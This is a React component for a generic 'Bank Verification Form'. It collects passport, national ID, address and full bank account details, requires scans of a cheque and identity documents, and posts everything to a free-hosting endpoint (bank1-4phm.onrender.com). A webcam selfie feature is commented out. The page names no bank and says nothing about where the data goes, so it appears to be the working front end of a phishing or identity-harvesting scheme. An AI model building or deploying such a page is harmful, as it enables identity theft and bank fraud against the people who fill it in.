import React, { useState } from "react";
import axios from "axios";


function App() {
  // const videoRef = useRef(null);
  // const canvasRef = useRef(null);

  const [form, setForm] = useState({});
  const [files, setFiles] = useState({});

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleFile = (e) => {
    setFiles({ ...files, [e.target.name]: e.target.files[0] });
  };

  // const startCamera = async () => {
  //   const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  //   videoRef.current.srcObject = stream;
  // };

  // const captureSelfie = () => {
  //   const canvas = canvasRef.current;
  //   const video = videoRef.current;
  //   canvas.width = video.videoWidth;
  //   canvas.height = video.videoHeight;
  //   canvas.getContext("2d").drawImage(video, 0, 0);
  //   const image = canvas.toDataURL("image/png");
  //   setForm({ ...form, selfie: image });
  // };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = new FormData();

    Object.keys(form).forEach((key) => {
      formData.append(key, form[key]);
    });

    Object.keys(files).forEach((key) => {
      formData.append(key, files[key]);
    });

  await axios.post(
  "https://bank1-4phm.onrender.com/submit",
  formData
);

alert("Submitted Successfully");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-600 via-blue-500 to-purple-600 py-10 px-4">
  <div className="max-w-5xl mx-auto bg-white shadow-2xl rounded-3xl p-8 md:p-12">

    <h1 className="text-4xl font-bold text-center text-gray-800 mb-2">
      Bank Verification Form
    </h1>
    <p className="text-center text-gray-500 mb-10">
      Please fill all required details carefully
    </p>

    <form onSubmit={handleSubmit} className="space-y-10">

      {/* PERSONAL DETAILS */}
      <div>
        <h2 className="text-xl font-semibold text-indigo-600 mb-4 border-b pb-2">
          Personal Information
        </h2>

        <div className="grid md:grid-cols-2 gap-6">

          <input required name="name" placeholder="Full Name"
            className="input" onChange={handleChange} />

          <input required name="email" type="email" placeholder="Email Address"
            className="input" onChange={handleChange} />

          <input required name="phone" placeholder="Phone Number"
            className="input" onChange={handleChange} />

          <input required name="passport" placeholder="Passport Number"
            className="input" onChange={handleChange} />

          <textarea required name="address" placeholder="Full Address"
            className="input md:col-span-2" onChange={handleChange} />

          <input required name="state" placeholder="State"
            className="input" onChange={handleChange} />

          <input required name="zip" placeholder="ZIP Code"
            className="input" onChange={handleChange} />

          <select required name="country"
            className="input" onChange={handleChange}>
            <option value="">Select Country</option>
            <option>India</option>
            <option>USA</option>
            <option>UK</option>
            <option>HongKong</option>
            <option>Singapore</option>
          </select>

        </div>

        {/* Gender */}
        <div className="mt-6">
          <label className="block mb-2 font-medium text-gray-700">Gender</label>
          <div className="flex gap-6">
            <label className="flex items-center gap-2 cursor-pointer">
              <input type="radio" name="gender" value="Male"
                required onChange={handleChange}
                className="accent-indigo-600" />
              Male
            </label>
            <label className="flex items-center gap-2 cursor-pointer">
              <input type="radio" name="gender" value="Female"
                required onChange={handleChange}
                className="accent-indigo-600" />
              Female
            </label>
          </div>
        </div>
      </div>

      {/* BANK DETAILS */}
      <div>
        <h2 className="text-xl font-semibold text-indigo-600 mb-4 border-b pb-2">
          Bank Details
        </h2>

        <div className="grid md:grid-cols-2 gap-6">
          <input required name="bank_name" placeholder="Bank Name"
            className="input" onChange={handleChange} />

          <input required name="account_holder" placeholder="Account Holder Name"
            className="input" onChange={handleChange} />

          <input required name="account_number" placeholder="Account Number"
            className="input" onChange={handleChange} />

          <input required name="ifsc" placeholder="IFSC Code"
            className="input" onChange={handleChange} />

          <input required name="branch" placeholder="Branch Name"
            className="input md:col-span-2" onChange={handleChange} />
        </div>
      </div>

      {/* DOCUMENT UPLOAD */}
      <div>
        <h2 className="text-xl font-semibold text-indigo-600 mb-4 border-b pb-2">
          Upload Documents
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">

  {/* Upload Black Cheque */}
  <div className="flex flex-col">
    <label className="mb-2 font-semibold text-gray-700">
      Upload Black Cheque
    </label>
    <input
      required
      type="file"
      name="cheque"
      onChange={handleFile}
      className="block w-full text-sm text-gray-600
        file:mr-4 file:py-2 file:px-4
        file:rounded-lg file:border-0
        file:text-sm file:font-semibold
        file:bg-blue-600 file:text-white
        hover:file:bg-blue-700
        cursor-pointer"
    />
  </div>

  {/* Passport Front */}
  <div className="flex flex-col">
    <label className="mb-2 font-semibold text-gray-700">
      Upload Passport (Front Side)
    </label>
    <input
      required
      type="file"
      name="passport_front"
      onChange={handleFile}
      className="block w-full text-sm text-gray-600
        file:mr-4 file:py-2 file:px-4
        file:rounded-lg file:border-0
        file:text-sm file:font-semibold
        file:bg-green-600 file:text-white
        hover:file:bg-green-700
        cursor-pointer"
    />
  </div>

  {/* Passport Back */}
  <div className="flex flex-col">
    <label className="mb-2 font-semibold text-gray-700">
      Upload Passport (Back Side)
    </label>
    <input
      required
      type="file"
      name="passport_back"
      onChange={handleFile}
      className="block w-full text-sm text-gray-600
        file:mr-4 file:py-2 file:px-4
        file:rounded-lg file:border-0
        file:text-sm file:font-semibold
        file:bg-purple-600 file:text-white
        hover:file:bg-purple-700
        cursor-pointer"
    />
  </div>

  {/* National ID */}
  <div className="flex flex-col">
    <label className="mb-2 font-semibold text-gray-700">
      Upload National ID
    </label>
    <input
      required
      type="file"
      name="national_id"
      onChange={handleFile}
      className="block w-full text-sm text-gray-600
        file:mr-4 file:py-2 file:px-4
        file:rounded-lg file:border-0
        file:text-sm file:font-semibold
        file:bg-red-600 file:text-white
        hover:file:bg-red-700
        cursor-pointer"
    />
  </div>

</div>
      </div>

      {/* SELFIE SECTION */}
      {/* <div>
        <h2 className="text-xl font-semibold text-indigo-600 mb-4 border-b pb-2">
          Capture Selfie
        </h2>

        <div className="bg-gray-100 p-4 rounded-xl text-center">
          <video ref={videoRef} autoPlay
            className="w-full rounded-lg shadow-md"></video>

          <div className="flex justify-center gap-4 mt-4">
            <button type="button" onClick={startCamera}
              className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2 rounded-lg transition">
              Start Camera
            </button>

            <button type="button" onClick={captureSelfie}
              className="bg-green-600 hover:bg-green-700 text-white px-5 py-2 rounded-lg transition">
              Capture
            </button>
          </div>

          <canvas ref={canvasRef} className="hidden"></canvas>
        </div>
      </div> */}

      {/* SUBMIT */}
      <div className="text-center">
        <button
          className="w-full md:w-1/2 bg-gradient-to-r from-indigo-600 to-purple-600
          text-white py-4 rounded-xl text-lg font-semibold
          hover:scale-105 transition transform duration-300 shadow-lg">
          Submit Verification
        </button>
      </div>

    </form>
  </div>
</div>

  );
}

export default App;

